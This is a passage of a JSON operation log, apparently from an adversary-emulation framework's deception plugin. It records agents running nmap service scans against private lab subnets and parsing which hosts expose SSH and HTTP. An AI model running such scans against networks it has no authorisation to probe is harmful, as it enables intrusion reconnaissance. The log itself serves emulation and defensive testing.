"host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4776710>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4776200>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.202.3", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.202.3", "created": "2024-04-26T23:41:40Z", "score": 3, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "b0cbf699-ce65-4366-b6b0-41edfb6611d3", "collect": "2024-04-26T23:41:41Z", "finish": "2024-04-26T23:41:42Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:41:41Z"}, {"id": "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "paw": "czljvk", "command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:41:45Z", "pin": 0, "pid": "1481", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf486e830>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf486e7a0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4912f20>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4910820>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4913fd0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49bd3c0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4667f10>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4667190>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4c955a0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4c96740>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4776d10>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770af0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:41:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.2,3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.2,3,4,5", "created": "2024-04-26T23:41:45Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "collect": "2024-04-26T23:41:52Z", "finish": "2024-04-26T23:41:59Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:41:52Z"}, {"id": "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "paw": "czljvk", "command": "nmap -sV --version-light -oX - 192.168.201.3,4,5,6,82,90", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.3,4,5,6,82,90", "status": 0, "score": 1, "decide": "2024-04-26T23:42:00Z", "pin": 0, "pid": "1485", "facts": [{"unique": "host.remote.ip192.168.201.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.3", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.5) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.4", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.4) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.5", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.5) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.5) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.6", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.6", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.82", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.82", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.201.90", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.90", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["czljvk", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.5) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4777c70>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a5fc0>", "source": {"unique": "host.remote.ip192.168.201.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.3", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4772110>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47720e0>", "source": {"unique": "host.remote.ip192.168.201.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.4", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4771ff0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4771fc0>", "source": {"unique": "host.remote.ip192.168.201.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.5", "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4771ea0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4770040>", "source": {"unique": "host.remote.ip192.168.201.6", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.201.6", "created": "2024-04-26T23:42:13Z", "score": 